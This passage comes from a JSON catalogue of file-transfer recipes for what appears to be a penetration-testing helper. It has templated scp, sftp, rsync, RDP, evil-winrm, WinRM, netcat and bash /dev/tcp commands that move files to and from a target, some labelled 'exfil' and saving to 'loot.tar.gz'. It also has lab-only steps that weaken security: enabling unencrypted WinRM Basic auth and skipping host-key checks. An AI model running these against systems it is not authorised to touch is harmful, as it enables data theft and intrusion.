      "ru": "Потоково отправляет локальный каталог на RHOST как tar.gz без промежуточного файла."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "stream",
    "priority": 20
  },
  {
    "id": "rsync-key",
    "title": "rsync key auth upload",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "rsync -avz -e \"ssh -p {ssh_port} -i {ssh_key} -o StrictHostKeyChecking=no\" \"{lhostpath}/{file}\" {rhost_user}@{rhost}:\"{remotefile}\""
      }
    ],
    "requires": [
      "rsync",
      "sshd",
      "key"
    ],
    "note": {
      "en": "Synchronizes a file with key-based rsync and host-key checking disabled. Lab use only.",
      "ru": "Синхронизирует файл через rsync по ключу с отключённой проверкой host key. Только для лаборатории."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "rsync",
    "priority": 30
  },
  {
    "id": "scp-port",
    "title": "SCP custom port",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "deliver",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "scp -P {ssh_port} \"{lhostpath}/{file}\" {rhost_user}@{rhost}:\"{remotefile}\""
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd"
    ],
    "note": {
      "en": "Uploads a file over a non-standard SSH port. scp uses uppercase -P; the port is set in Advanced parameters.",
      "ru": "Загружает файл через нестандартный SSH-порт. У scp флаг порта - заглавная -P; порт задаётся в Advanced parameters."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "scp",
    "priority": 30
  },
  {
    "id": "sftp-put",
    "title": "SFTP upload",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "deliver",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "sftp -P {ssh_port} {rhost_user}@{rhost}"
      },
      {
        "side": "lhost",
        "shell": "sftp",
        "text": "put \"{lhostpath}/{file}\" \"{remotefile}\""
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd"
    ],
    "note": {
      "en": "Uploads a file over an interactive SFTP session. The second command is entered inside sftp; use put -r for a directory.",
      "ru": "Загружает файл через интерактивную сессию SFTP. Вторая команда вводится внутри sftp; для каталога используйте put -r."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "sftp",
    "priority": 30
  },
  {
    "id": "scp-key",
    "title": "SCP key auth",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "deliver",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "scp -P {ssh_port} -i \"{ssh_key}\" \"{lhostpath}/{file}\" {rhost_user}@{rhost}:\"{remotefile}\""
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd",
      "key"
    ],
    "note": {
      "en": "Uploads a file with key-based SSH authentication. The private key path is set in Advanced parameters.",
      "ru": "Загружает файл с аутентификацией по SSH-ключу. Путь к ключу задаётся в Advanced parameters."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "scp",
    "priority": 40
  },
  {
    "id": "scp-reverse-deliver",
    "title": "SCP reverse upload",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "deliver",
    "source": "06",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "scp {lhost_user}@{lhost}:{lhostpath}/{file} \"{remotefile}\""
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd on LHOST"
    ],
    "note": {
      "en": "Pulls a file from LHOST to RHOST when sshd runs on LHOST. Run the command on RHOST.",
      "ru": "Забирает файл с LHOST на RHOST, когда sshd работает на LHOST. Команда запускается на RHOST."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "scp",
    "priority": 40
  },
  {
    "id": "scp-compress",
    "title": "SCP compression",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "deliver",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "scp -C -P {ssh_port} \"{lhostpath}/{file}\" {rhost_user}@{rhost}:\"{remotefile}\""
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd"
    ],
    "note": {
      "en": "Uploads a file with SSH compression enabled. This helps on slow links but not on already compressed files.",
      "ru": "Загружает файл со сжатием SSH. Это помогает на медленных каналах, но не на уже сжатых файлах."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "scp",
    "priority": 50
  },
  {
    "id": "scp-bandwidth",
    "title": "SCP bandwidth limit",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "deliver",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "scp -l 1000 -P {ssh_port} \"{lhostpath}/{file}\" {rhost_user}@{rhost}:\"{remotefile}\""
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd"
    ],
    "note": {
      "en": "Uploads a file with a 1000 Kbit/s bandwidth cap. Change -l for a different limit.",
      "ru": "Загружает файл с ограничением 1000 Кбит/с. Измените -l для другого лимита."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "scp",
    "priority": 60
  },
  {
    "id": "scp-no-hostkey",
    "title": "SCP skip host key check",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "deliver",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -P {ssh_port} \"{lhostpath}/{file}\" {rhost_user}@{rhost}:\"{remotefile}\""
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd"
    ],
    "note": {
      "en": "Uploads a file while skipping SSH host-key verification. Lab-only; do not use it on untrusted networks.",
      "ru": "Загружает файл без проверки SSH host key. Только для лаборатории; не используйте в недоверенных сетях."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "scp",
    "priority": 70
  },
  {
    "id": "scp-legacy",
    "title": "SCP legacy protocol (-O)",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "deliver",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "scp -O -P {ssh_port} \"{lhostpath}/{file}\" {rhost_user}@{rhost}:\"{remotefile}\""
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd"
    ],
    "note": {
      "en": "Uploads a file using the legacy SCP protocol. Use it only when the server does not understand scp over SFTP.",
      "ru": "Загружает файл по устаревшему протоколу SCP. Только если сервер не понимает scp поверх SFTP."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "scp",
    "priority": 80
  },
  {
    "id": "pscp-exfil",
    "title": "PSCP download",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "exfil",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "cmd",
        "text": "pscp.exe -pw '{rhost_pass}' {rhost_user}@{rhost}:\"{remotefile}\" \"C:\\Users\\Public\\{file}\""
      }
    ],
    "requires": [
      "PuTTY pscp.exe",
      "sshd"
    ],
    "note": {
      "en": "Downloads a file with PuTTY pscp.exe into C:\\Users\\Public. -pw exposes the password in process listings.",
      "ru": "Скачивает файл через PuTTY pscp.exe в C:\\Users\\Public. -pw оставляет пароль видимым в списке процессов."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "pscp",
    "priority": 10
  },
  {
    "id": "scp-exfil",
    "title": "SCP download",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "exfil",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "scp {rhost_user}@{rhost}:\"{remotefile}\" {lhostpath}/"
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd"
    ],
    "note": {
      "en": "Downloads a remote file to /tmp/share on LHOST over SSH. Set RHOST and RHOST user in Advanced parameters.",
      "ru": "Скачивает удалённый файл в /tmp/share на LHOST по SSH. Укажите RHOST и пользователя RHOST в Advanced parameters."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "scp",
    "priority": 10
  },
  {
    "id": "sftp-get",
    "title": "SFTP download",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "exfil",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "sftp -P {ssh_port} {rhost_user}@{rhost}"
      },
      {
        "side": "lhost",
        "shell": "sftp",
        "text": "lcd \"{lhostpath}\""
      },
      {
        "side": "lhost",
        "shell": "sftp",
        "text": "get \"{remotefile}\""
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd"
    ],
    "note": {
      "en": "Downloads a file over an interactive SFTP session. The lcd and get commands are entered inside sftp; use get -r for a directory.",
      "ru": "Скачивает файл через интерактивную сессию SFTP. Команды lcd и get вводятся внутри sftp; для каталога используйте get -r."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "sftp",
    "priority": 10
  },
  {
    "id": "sshfs-mount",
    "title": "sshfs mount",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "exfil",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "sshfs -p {ssh_port} {rhost_user}@{rhost}:{remote} /mnt"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cp \"/mnt/{file}\" {lhostpath}/"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "fusermount -u /mnt"
      }
    ],
    "requires": [
      "sshfs",
      "sshd"
    ],
    "note": {
      "en": "Mounts the RHOST directory with sshfs, copies one file to /tmp/share, then unmounts.",
      "ru": "Монтирует каталог RHOST через sshfs, копирует один файл в /tmp/share и размонтирует."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "sshfs",
    "priority": 10
  },
  {
    "id": "tar-ssh-pull",
    "title": "tar over SSH (pull directory)",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "exfil",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ssh -p {ssh_port} {rhost_user}@{rhost} \"tar czf - {remote}\" > {lhostpath}/loot.tar.gz"
      }
    ],
    "requires": [
      "ssh",
      "tar",
      "sshd"
    ],
    "note": {
      "en": "Streams a remote directory to LHOST as a compressed tar archive in /tmp/share.",
      "ru": "Потоково забирает удалённый каталог на LHOST как tar.gz в /tmp/share."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "stream",
    "priority": 10
  },
  {
    "id": "rsync-exfil",
    "title": "rsync download",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "exfil",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "rsync -avz -e \"ssh -p {ssh_port}\" {rhost_user}@{rhost}:\"{remotefile}\" {lhostpath}/"
      }
    ],
    "requires": [
      "rsync",
      "sshd"
    ],
    "note": {
      "en": "Synchronizes a remote file to /tmp/share on LHOST over SSH. Useful for large files and resumed transfers; set the SSH port in Advanced parameters.",
      "ru": "Синхронизирует удалённый файл в /tmp/share на LHOST по SSH. Удобно для больших файлов и докачки; SSH-порт задаётся в Advanced parameters."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "rsync",
    "priority": 20
  },
  {
    "id": "scp-exfil-dir",
    "title": "SCP download (directory)",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "exfil",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "scp -r {rhost_user}@{rhost}:\"{remote}/\" {lhostpath}/"
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd"
    ],
    "note": {
      "en": "Pulls a remote directory recursively into /tmp/share on LHOST.",
      "ru": "Рекурсивно скачивает каталог с цели в /tmp/share на LHOST."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "scp",
    "priority": 20
  },
  {
    "id": "sftp-key",
    "title": "SFTP key auth download",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "exfil",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "sftp -P {ssh_port} -i \"{ssh_key}\" {rhost_user}@{rhost}"
      },
      {
        "side": "lhost",
        "shell": "sftp",
        "text": "lcd \"{lhostpath}\""
      },
      {
        "side": "lhost",
        "shell": "sftp",
        "text": "get \"{remotefile}\""
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd",
      "key"
    ],
    "note": {
      "en": "Downloads a file over SFTP with key authentication. The lcd and get commands are entered inside the session.",
      "ru": "Скачивает файл через SFTP с аутентификацией по ключу. Команды lcd и get вводятся внутри сессии."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "sftp",
    "priority": 20
  },
  {
    "id": "scp-reverse-exfil",
    "title": "SCP reverse download",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "exfil",
    "source": "06",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "scp \"{remotefile}\" {lhost_user}@{lhost}:{lhostpath}/"
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd on LHOST"
    ],
    "note": {
      "en": "Pushes a file from RHOST to LHOST when sshd runs on LHOST. Run the command on RHOST.",
      "ru": "Отправляет файл с RHOST на LHOST, когда sshd работает на LHOST. Команда запускается на RHOST."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "scp",
    "priority": 30
  },
  {
    "id": "tar-ssh-single",
    "title": "tar over SSH (single file)",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "exfil",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ssh -p {ssh_port} {rhost_user}@{rhost} \"cat \\\"{remotefile}\\\"\" > {lhostpath}/{file}"
      }
    ],
    "requires": [
      "ssh",
      "sshd"
    ],
    "note": {
      "en": "Pulls a single remote file to stdout and writes it into /tmp/share.",
      "ru": "Забирает один удалённый файл через stdout и записывает его в /tmp/share."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "stream",
    "priority": 30
  },
  {
    "id": "rsync-dry-run",
    "title": "rsync dry run",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "exfil",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "rsync -avzn -e \"ssh -p {ssh_port}\" {rhost_user}@{rhost}:\"{remotefile}\" {lhostpath}/"
      }
    ],
    "requires": [
      "rsync",
      "sshd"
    ],
    "note": {
      "en": "Shows what rsync would copy without writing to disk.",
      "ru": "Показывает, что скопировал бы rsync, без записи на диск."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "rsync",
    "priority": 40
  },
  {
    "id": "sftp-batch",
    "title": "SFTP batch download",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "exfil",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && sftp -b sftp_batch.txt -P {ssh_port} {rhost_user}@{rhost}"
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd"
    ],
    "note": {
      "en": "Runs a non-interactive SFTP batch file. Start from the **sftp_batch.txt** helper above and adjust the local and remote paths.",
      "ru": "Запускает неинтерактивный SFTP batch-файл. Возьмите **sftp_batch.txt** из блока выше и поправьте локальный и удалённый пути."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "sftp",
    "priority": 40,
    "helpers": [
      {
        "name": "sftp_batch.txt",
        "text": "lcd {lhostpath}\nget {remotefile}\n",
        "side": "lhost"
      }
    ]
  },
  {
    "id": "sftp-oneliner",
    "title": "SFTP one-liner download",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "exfil",
    "source": "06",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && echo \"get {file}\" | sftp -P {ssh_port} {rhost_user}@{rhost}"
      }
    ],
    "requires": [
      "OpenSSH client",
      "sshd"
    ],
    "note": {
      "en": "Downloads a file with one SFTP get through stdin, without an interactive session.",
      "ru": "Скачивает файл одной командой get через stdin, без интерактивной сессии."
    },
    "docs": "docs/en/06-scp-sftp-rsync.md",
    "channel": "ssh",
    "family": "sftp",
    "priority": 50
  },
  {
    "id": "rdp-deliver",
    "title": "RDP drive mount (download)",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "08",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "xfreerdp /v:{rhost} /u:{rhost_user} /d:{domain} /p:'{rhost_pass}' /drive:share,{lhostpath}"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "copy \"\\\\tsclient\\share\\{file}\" \"{remotefile}\""
      }
    ],
    "requires": [
      "freerdp",
      "RDP"
    ],
    "note": {
      "en": "Opens an RDP session with a mounted drive, then copies the file from the shared drive on RHOST. Set RHOST, user, domain, and password in Advanced parameters.",
      "ru": "Открывает RDP-сессию с примонтированным диском и копирует файл с общей шары на RHOST. Укажите RHOST, пользователя, домен и пароль в Advanced parameters."
    },
    "docs": "docs/en/08-rdp-winrm.md",
    "channel": "rdp",
    "family": "gui",
    "priority": 10
  },
  {
    "id": "rdp-exfil",
    "title": "RDP drive mount (upload)",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "exfil",
    "source": "08",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "xfreerdp /v:{rhost} /u:{rhost_user} /d:{domain} /p:'{rhost_pass}' /drive:share,{lhostpath}"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "copy \"{remotefile}\" \"\\\\tsclient\\share\\{file}\""
      }
    ],
    "requires": [
      "freerdp",
      "RDP"
    ],
    "note": {
      "en": "Opens an RDP session with a mounted drive, then copies the file from RHOST into /tmp/share on LHOST. Set RHOST, user, domain, and password in Advanced parameters.",
      "ru": "Открывает RDP-сессию с примонтированным диском и копирует файл с RHOST в /tmp/share на LHOST. Укажите RHOST, пользователя, домен и пароль в Advanced parameters."
    },
    "docs": "docs/en/08-rdp-winrm.md",
    "channel": "rdp",
    "family": "gui",
    "priority": 20
  },
  {
    "id": "evil-winrm-upload",
    "title": "evil-winrm upload",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "08",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "evil-winrm -i {rhost} -u {rhost_user} -p '{rhost_pass}'"
      },
      {
        "side": "lhost",
        "shell": "evil-winrm",
        "text": "upload \"{lhostpath}/{file}\" \"{remotefile}\""
      }
    ],
    "requires": [
      "evil-winrm",
      "WinRM"
    ],
    "note": {
      "en": "Opens an evil-winrm session, then uploads the file to RHOST. The second command is entered inside evil-winrm; set RHOST and credentials in Advanced parameters.",
      "ru": "Открывает сессию evil-winrm и загружает файл на RHOST. Вторая команда вводится внутри evil-winrm; укажите RHOST и учётные данные в Advanced parameters."
    },
    "docs": "docs/en/08-rdp-winrm.md",
    "channel": "winrm",
    "family": "winrm",
    "priority": 10
  },
  {
    "id": "winrm-check",
    "title": "WinRM check",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "winrm",
    "family": "diagnostics",
    "priority": 10,
    "source": "08",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -zv {rhost} 5985"
      },
      {
        "side": "lhost",
        "shell": "powershell",
        "text": "Test-WSMan -ComputerName \"{rhost}\""
      },
      {
        "side": "lhost",
        "shell": "powershell",
        "text": "Get-PSSessionConfiguration -ComputerName \"{rhost}\""
      }
    ],
    "requires": [
      "WinRM"
    ],
    "note": {
      "en": "Checks 5985/tcp and WinRM configuration. The PowerShell steps need pwsh or a Windows LHOST.",
      "ru": "Проверяет 5985/tcp и конфигурацию WinRM. Для PowerShell-шагов нужен pwsh или Windows-LHOST."
    },
    "docs": "docs/en/08-rdp-winrm.md"
  },
  {
    "id": "winrm-copy-deliver",
    "title": "WinRM Copy-Item (deliver)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "winrm",
    "family": "copy",
    "priority": 10,
    "source": "08",
    "steps": [
      {
        "side": "lhost",
        "shell": "powershell",
        "text": "$p=ConvertTo-SecureString '{rhost_pass}' -AsPlainText -Force;$c=New-Object PSCredential('{rhost_user}',$p);$s=New-PSSession -ComputerName '{rhost}' -Credential $c;Copy-Item -Path '{lhostpath}/{file}' -ToSession $s -Destination '{remotefile}';Remove-PSSession $s"
      }
    ],
    "requires": [
      "WinRM"
    ],
    "note": {
      "en": "Creates a PowerShell session and copies one file to RHOST with Copy-Item -ToSession.",
      "ru": "Создаёт PowerShell-сессию и копирует файл на RHOST через Copy-Item -ToSession."
    },
    "docs": "docs/en/08-rdp-winrm.md"
  },
  {
    "id": "winrm-enable",
    "title": "WinRM enable",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "winrm",
    "family": "setup",
    "priority": 10,
    "source": "08",
    "steps": [
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "Enable-PSRemoting -Force"
      },
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "winrm set winrm/config/service/auth '@{Basic=\"true\"}'"
      },
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "winrm set winrm/config/service '@{AllowUnencrypted=\"true\"}'"
      }
    ],
    "requires": [
      "Administrator"
    ],
    "note": {
      "en": "Enables PowerShell Remoting and, for labs, Basic auth over unencrypted HTTP. Requires Administrator; do not use in production.",
      "ru": "Включает PowerShell Remoting и, для лаборатории, Basic auth поверх HTTP без шифрования. Нужен Administrator; не используйте в production."
    },
    "docs": "docs/en/08-rdp-winrm.md"
  },
  {
    "id": "winrm-copy-exfil",
    "title": "WinRM Copy-Item (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "winrm",
    "family": "copy",
    "priority": 10,
    "source": "08",
    "steps": [
      {
        "side": "lhost",
        "shell": "powershell",
        "text": "$p=ConvertTo-SecureString '{rhost_pass}' -AsPlainText -Force;$c=New-Object PSCredential('{rhost_user}',$p);$s=New-PSSession -ComputerName '{rhost}' -Credential $c;Copy-Item -Path '{remotefile}' -Destination '{lhostpath}/{file}' -FromSession $s;Remove-PSSession $s"
      }
    ],
    "requires": [
      "WinRM"
    ],
    "note": {
      "en": "Creates a PowerShell session and pulls one file from RHOST with Copy-Item -FromSession.",
      "ru": "Создаёт PowerShell-сессию и забирает файл с RHOST через Copy-Item -FromSession."
    },
    "docs": "docs/en/08-rdp-winrm.md"
  },
  {
    "id": "evil-winrm-download",
    "title": "evil-winrm download",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "exfil",
    "source": "08",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "evil-winrm -i {rhost} -u {rhost_user} -p '{rhost_pass}'"
      },
      {
        "side": "lhost",
        "shell": "evil-winrm",
        "text": "download \"{remotefile}\""
      }
    ],
    "requires": [
      "evil-winrm",
      "WinRM"
    ],
    "note": {
      "en": "Opens an evil-winrm session, then downloads the file into the current LHOST directory. The second command is entered inside evil-winrm.",
      "ru": "Открывает сессию evil-winrm и скачивает файл в текущий каталог LHOST. Вторая команда вводится внутри evil-winrm."
    },
    "docs": "docs/en/08-rdp-winrm.md",
    "channel": "winrm",
    "family": "winrm",
    "priority": 20
  },
  {
    "id": "bash-devtcp-raw",
    "title": "bash /dev/tcp (download)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "nc",
    "family": "shell",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -lvnp {lport} -q 0 < \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "cat < /dev/tcp/{lhost}/{lport} > \"{remotefile}\""
      }
    ],
    "requires": [
      "bash",
      "nc"
    ],
    "note": {
      "en": "No netcat on the target: bash opens the socket itself. /dev/tcp is a bash feature, not POSIX sh.",
      "ru": "Netcat на цели нет: bash сам открывает сокет. /dev/tcp есть в bash, но не в POSIX sh."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "nc-bind-deliver",
    "title": "netcat bind (download)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "nc",
    "family": "bind",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "nc -lvnp {lport} -q 0 > \"{remotefile}\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -q 0 {rhost} {lport} < \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "nc"
    ],
    "note": {
      "en": "The target listens and we connect to it. Use this when RHOST cannot reach LHOST, and open the port on the target firewall.",
      "ru": "Цель слушает, мы подключаемся к ней. Используйте, когда RHOST не может достучаться до LHOST, и откройте порт на файрволе цели."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "nc-diagnostics",
    "title": "netcat diagnostics",
    "profiles": [
      "core"
    ],
    "os": [
      "windows",
      "linux"
    ],
    "direction": "deliver",
    "channel": "nc",
    "family": "diagnostics",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -h 2>&1 | head -20"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ss -tlnp | grep {lport}"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -zv {rhost} {lport}"
      }
    ],
    "requires": [
      "nc",
      "ss"
    ],
    "note": {
      "en": "Check which nc variant is installed, whether LHOST is listening, and whether RHOST accepts the port.",
      "ru": "Проверяет вариант nc, слушает ли LHOST и принимает ли RHOST порт."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "nc-deliver",
    "title": "netcat reverse (download)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "nc",
    "family": "reverse",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -lvnp {lport} -q 0 < \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "nc -q 0 {lhost} {lport} > \"{remotefile}\""
      }
    ],
    "requires": [
      "nc"
    ],
    "note": {
      "en": "The target dials out to LHOST and receives the file. Swap -q 0 for -N on OpenBSD netcat.",
      "ru": "Цель сама подключается к LHOST и принимает файл. В OpenBSD netcat замените -q 0 на -N."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "ps-tcp-deliver",
    "title": "PowerShell TcpClient (download)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "nc",
    "family": "powershell",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -lvnp {lport} -q 0 < \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "$c=New-Object Net.Sockets.TcpClient(\"{lhost}\",{lport});$s=$c.GetStream();$m=New-Object IO.MemoryStream;$b=New-Object byte[] 8192;while(($n=$s.Read($b,0,$b.Length)) -gt 0){$m.Write($b,0,$n)};[IO.File]::WriteAllBytes(\"{remotefile}\",$m.ToArray());$c.Close()"
      }
    ],
    "requires": [
      "PowerShell",
      ".NET"
    ],
    "note": {
      "en": "No nc.exe needed: .NET sockets do the transfer. The loop keeps reading until the sender closes the connection.",
      "ru": "nc.exe не нужен: передача идёт через сокеты .NET. Цикл читает, пока отправитель не закроет соединение."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "nc-tar-deliver",
    "title": "tar over netcat (download)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "nc",
    "family": "stream",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "tar czf - \"{lhostpath}/{file}\" | nc -lvnp {lport} -q 0"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "nc -q 0 {lhost} {lport} | tar xzf - -C \"{remote}\""
      }
    ],
    "requires": [
      "nc",
      "tar"
    ],
    "note": {
      "en": "Streams a file or directory to the target without an intermediate archive. Set File to a directory to send a tree.",
      "ru": "Передаёт файл или каталог на цель без промежуточного архива. Укажите в File каталог, чтобы отправить дерево."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "nc-win-bind-deliver",
    "title": "netcat.exe bind (download)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "nc",
    "family": "bind",
    "priority": 20,
    "source": "07",
    "steps": [
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "nc.exe -lvnp {lport} > \"{remotefile}\""
      },
      {
        "side": "lhost",
        "shell": "bash",
